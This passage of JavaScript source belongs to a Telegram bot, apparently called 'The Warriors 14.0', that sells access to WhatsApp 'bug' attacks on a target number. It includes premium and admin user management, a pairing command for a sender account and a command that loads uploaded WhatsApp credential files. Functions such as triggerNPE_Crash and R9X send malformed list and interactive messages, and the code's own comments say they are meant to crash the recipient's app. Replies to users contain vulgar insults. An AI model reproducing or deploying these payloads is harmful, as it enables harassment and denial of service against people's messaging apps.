    parse_mode: "Markdown",
  });

  if (!ownerUsers.includes(ctx.from.id)) setGlobalCooldown();

  for (let i = 1; i < progressStages.length; i++) {
    await new Promise((r) => setTimeout(r, 2000));
    await ctx.telegram.editMessageCaption(chatId, sentMessage.message_id, undefined,
      `\`\`\`
▢ Target: ${q}
▢ Status: Prosessing
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨 : ${progressStages[i]}

© The Warriors 14.0
Bug Sudah Terkirim! Silahkan Dicek!
\`\`\``,
      { parse_mode: "Markdown" }
    );
  }

  for (let i = 0; i < 10; i++) {
  }

  await ctx.telegram.editMessageMedia(
    chatId,
    sentMessage.message_id,
    undefined,
    {
      type: "photo",
      media: successImg,
      caption: `\`\`\`
▢ Target: ${q}
▢ Status: Successfully...
▢ 𝙋𝙧𝙤𝙜𝙧𝙚𝙨: [██████████] 100%

© The Warriors 14.0
\`\`\``,
      parse_mode: "Markdown",
    },
    {
      reply_markup: {
        inline_keyboard: [
          [{ text: "CEK TARGET ‼️", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});


// Hakbar Generator
function generateHakbar(percent) {
  const full = Math.floor(percent / 10);
  const empty = 10 - full;
  return `[${"█".repeat(full)}${"░".repeat(empty)}]`;
}
////𝘾𝙤𝙣𝙩𝙧𝙤𝙡 𝙈𝙚𝙣𝙪
// Perintah untuk menambahkan pengguna premium (hanya owner)
bot.command("addowner", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addowner 6725042105"
    );
  }

  const userId = args[1];

  if (ownerUsers.includes(userId)) {
    return ctx.reply(`✅ Idiot ${userId} sudah memiliki status Owner.`);
  }

  ownerUsers.push(userId);
  saveJSON(ownerFile, ownerUsers);

  return ctx.reply(`✅ Klz Bocah ${userId} sekarang memiliki akses Owner!`);
});

bot.command("addadmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dijadikan Admin.\nContoh: /addadmin 6725042105"
    );
  }

  const userId = args[1];

  if (adminUsers.includes(userId)) {
    return ctx.reply(`✅ Pengguna ${userId} sudah memiliki status Admin.`);
  }

  adminUsers.push(userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`✅ Pengguna ${userId} sekarang memiliki akses Admin!`);
});

bot.command("addprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.split(" ");

  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukin ID Nya GOBLOK !!\nContohnya Gini Nyet: /addprem 6725042105"
    );
  }

  const userId = args[1];

  if (premiumUsers.includes(userId)) {
    return ctx.reply(
      `✅ kelaz sih yatem ini ${userId} sudah memiliki status premium.`
    );
  }

  premiumUsers.push(userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(
    `✅ kelaz sih yatem ini ${userId} sudah memiliki status premium.`
  );
});

// Perintah untuk menghapus pengguna premium (hanya owner)
// Command untuk restart
bot.command("restart", (ctx) => {
  const userId = ctx.from.id.toString();

  ctx.reply("Berhasil Merestart bot...");
  restartBot();
});

bot.command("delowner", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");


  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /delowner 123456789"
    );
  }

  const userId = args[1];

  if (!ownerUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Owner.`);
  }

  ownerUsers = ownerUsers.filter((id) => id !== userId);
  saveJSON(ownerFile, ownerUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Owner.`);
});

bot.command("deladmin", checkOwner, (ctx) => {
  const args = ctx.message.text.split(" ");


  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari Admin.\nContoh: /deladmin 123456789"
    );
  }

  const userId = args[1];

  if (!adminUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar Admin.`);
  }

  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);

  return ctx.reply(`🚫 Pengguna ${userId} telah dihapus dari daftar Admin.`);
});
bot.command("delprem", checkOwner, checkAdmin, (ctx) => {
  const args = ctx.message.text.split(" ");
  
  if (args.length < 2) {
    return ctx.reply(
      "❌ Masukkan ID pengguna yang ingin dihapus dari premium.\nContoh: /delprem 123456789"
    );
  }

  const userId = args[1];

  if (!premiumUsers.includes(userId)) {
    return ctx.reply(`❌ Pengguna ${userId} tidak ada dalam daftar premium.`);
  }

  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);

  return ctx.reply(`🚫 Haha Mampus Lu ${userId} Di delprem etmin🗿.`);
});


const fetch = require('node-fetch');
const FormData = require('form-data');
const { fromBuffer } = require('file-type');

// Perintah untuk mengecek status premium
bot.command("cekprem", (ctx) => {
  const userId = ctx.from.id.toString();



  if (premiumUsers.includes(userId)) {
    return ctx.reply(`✅ Anda adalah pengguna premium.`);
  } else {
    return ctx.reply(`❌ Anda bukan pengguna premium.`);
  }
});

// Command untuk pairing WhatsApp
bot.command("delsession", checkOwner, checkAdmin, async (ctx) => {
  
  try {
    await fs.promises.rm('./session', { recursive: true, force: true });
    WhatsAppConnected = false;
    await ctx.reply('✅ Session Berhasil dihapus!');
    startSesi();
  } catch (error) {
    await ctx.reply('❌ Gagal menghapus session!');
  }
});

bot.command("addsender", checkOwner, async (ctx) => {
  const args = ctx.message.text.split(" ");



  if (args.length < 2) {
    return await ctx.reply(
      "❌ Masukin nomor nya ngentot, Contoh nih mek /addsender <nomor_wa>"
    );
  }

  let phoneNumber = args[1];
  phoneNumber = phoneNumber.replace(/[^0-9]/g, "");

  if (sock && sock.user) {
    return await ctx.reply("Masih Ada Sender Jika Tidak Terconnect Hapus Session dengan /delsession");
  }

  try {
    const code = await sock.requestPairingCode(phoneNumber, "WARRIORS");
    const formattedCode = code?.match(/.{1,4}/g)?.join("-") || code;

    await ctx.replyWithPhoto(getRandomImage(), {
      caption: `
\`\`\`
▢ 𝙆𝙤𝙙𝙚 𝙋𝙖𝙞𝙧𝙞𝙣𝙜 𝘼𝙣𝙙𝙖...
╰➤ 𝙉𝙤𝙢𝙤𝙧  : ${phoneNumber} 
╰➤ 𝙆𝙤𝙙𝙚   : ${formattedCode}\`\`\`
`,

      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "Contact Dev 🦖", 
              url: "t.me/OBITOBOYS"
            },
            ]
         ],
      },
    });
  } catch (error) {
    console.error(chalk.red("Gagal melakukan pairing:"), error);
    await ctx.reply(
      "❌ Gagal melakukan pairing. Pastikan nomor WhatsApp valid dan dapat menerima SMS."
    );
  }
});

//NO SENDER
bot.command("add", async (ctx) => {
  const file = ctx.message.document;
  const fileName = file.file_name;

  // Validasi ekstensi file
  if (!fileName.endsWith(".json")) {
    return ctx.reply("❌ Bukan file sesi .json");
  }

  // Kirim notifikasi awal
  await ctx.reply(`📂 Mendeteksi file creds: ${fileName}\nSedang diproses...`);

  try {
    const fileLink = await ctx.telegram.getFileLink(file.file_id);
    const filePath = path.join(__dirname, "sessions", fileName);
    const response = await fetch(fileLink.href);
    const writer = fs.createWriteStream(filePath);
    await new Promise((resolve, reject) => {
      response.body.pipe(writer);
      writer.on("finish", resolve);
      writer.on("error", reject);
    });

    // Buat nama session
    const sessionName = "Bot" + path.basename(fileName, ".json");

    // Inisialisasi koneksi ke WhatsApp
    const { state, saveCreds } = await useSingleFileAuthState(filePath);
    const sock = makeWASocket({
      auth: state,
      printQRInTerminal: false,
    });

    sock.ev.on("creds.update", saveCreds);

    // Jika koneksi terputus
    sock.ev.on("connection.update", ({ connection }) => {
      if (connection === "close") {
        ctx.reply(`⚠️ Session ${sessionName} terputus.`);
      }
    });

    // Berhasil terhubung
    ctx.reply(`✅ Session ${sessionName} berhasil terkoneksi!`);
  } catch (error) {
    console.error("❌ ERROR saat koneksi:", error);
    ctx.reply("❌ Gagal menghubungkan sesi.");
  }
});

// Handler untuk tombol close
bot.action("close", async (ctx) => {
  try {
    await ctx.deleteMessage();
  } catch (error) {
    console.error(chalk.red("Gagal menghapus pesan:"), error);
  }
});
// Fungsi untuk merestart bot menggunakan PM2
const restartBot = () => {
  pm2.connect((err) => {
    if (err) {
      console.error("Gagal terhubung ke PM2:", err);
      return;
    }

    pm2.restart("index", (err) => {
      // 'index' adalah nama proses PM2 Anda
      pm2.disconnect(); // Putuskan koneksi setelah restart
      if (err) {
        console.error("Gagal merestart bot:", err);
      } else {
        console.log("Bot berhasil direstart.");
      }
    });
  });
};

//TEMPAT FUNCTION MEMEK

async function CrlSql(sock, target) {
  let message = {
    interactiveResponseMessage: {
      header: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4&oh=01_Q5Aa2wGoHq3M24ZbF0TDnEhYSG2jwm21vorcv-ZQ4_fKDWEhyQ&oe=692EDC9C&_nc_sid=e6ed6c&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "st3b6ca+9gVb+qgoTd66spG6OV63M/b4/DEM2vcjWDc=",
          fileLength: "71746",
          height: 916,
          width: 720,
        },
        hasMediaAttachment: true
      },
      body: {
        text: "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
        format: "EXTENSIONS_1"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: JSON.stringify({
          header: "null",
          body: "xxx",
          flow_action: "navigate",
          flow_action_payload: { screen: "FORM_SCREEN" },
          flow_cta: "Grattler",
          flow_id: "1169834181134583",
          flow_message_version: "3",
          flow_token: "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        }),
        version: 3
      },
      contextInfo: {
        isForwarded: true,
        forwardingScore: 999,
      }
    }
  };

  sock.relayMessage(
    target,
    message
      ? {
          participant: { jid: target }
        }
      : {}
  );
}

async function KirimInteractiveMsg(sock, target) {
  try {
    await sock.relayMessage(target, {
      header: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4&oh=01_Q5Aa2wGoHq3M24ZbF0TDnEhYSG2jwm21vorcv-ZQ4_fKDWEhyQ&oe=692EDC9C&_nc_sid=e6ed6c&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "st3b6ca+9gVb+qgoTd66spG6OV63M/b4/DEM2vcjWDc=",
          fileLength: "12345",
          height: 916,
          width: 720,
        },
        hasMediaAttachment: true
      },
      body: {
        text: "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ"
      },
    contextInfo: {
      forwardingScore: 999,
      isForwarded: true
    }
    }, {
      messageId: require('crypto').randomBytes(16).toString('hex').toUpperCase()
    });
  } catch (e) {
    console.log("KirimInteractiveMsg error:", e.message);
  }
}

async function triggerNPE_Crash(sock, target) {
  try {
    console.log("Mengirim payload pemicu NPE...");

    await sock.relayMessage(target, {
      listMessage: {
        title: "🔴 Menu Error 🔴",
        description: "Pilih opsi di bawah ini.",
        buttonText: "Lihat Menu",
        listType: 1, 
        
        sections: [{
          title: "Bagian Aneh",
          rows: [
            // Ini barisan yang rusak:
            // WhatsApp mengharapkan objek {rowId, title, description}, 
            // tapi kita kirim null/undefined di dalam array.
            undefined, 
            null,
            { rowId: "valid", title: "Tombol Valid (Akan dilewati)" }
          ]
        }]
      }
    }, {
      // Message ID jangan null
      messageId: require('crypto').randomBytes(16).toString('hex').toUpperCase()
    });

    console.log("Pesan terkirim.");
    
  } catch (e) {
    // Biasanya library baileys akan nge-halt di sini sebelum terkirim
    // karena validasi lokalnya mendeteksi rows yang rusak.
    console.error("Gagal relay message:", e.message);
  }
}

async function R9X(sock, target) {
  var R9X = {
    header: {
        imageMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t24/f2/m232/AQN3a5sxmYjKKiDCEia7o9Zrg7LsYhjYZ36N28icbWw4sILKuf3ly85yuuQx5aH5NGMTqM_YOT7bYt77BJZkbMEwovlDNyxyQ3RNmeoebw?ccb=9-4&oh=01_Q5Aa2wGoHq3M24ZbF0TDnEhYSG2jwm21vorcv-ZQ4_fKDWEhyQ&oe=692EDC9C&_nc_sid=e6ed6c&mms3=true",
          mimetype: "image/jpeg",
          fileSha256: "st3b6ca+9gVb+qgoTd66spG6OV63M/b4/DEM2vcjWDc=",
          fileLength: "12345",
          height: 916,
          width: 720,
        },
        hasMediaAttachment: true
      },
    };

  sock.relayMessage(
    target,
    R9X
      ? {
          participant: { jid: target }
        }
      : {}
  );
}

// --- Jalankan Bot ---
    console.log("🚀 Memulai sesi WhatsApp...");
    startSesi();

    console.log("Sukses connected");
    bot.launch();
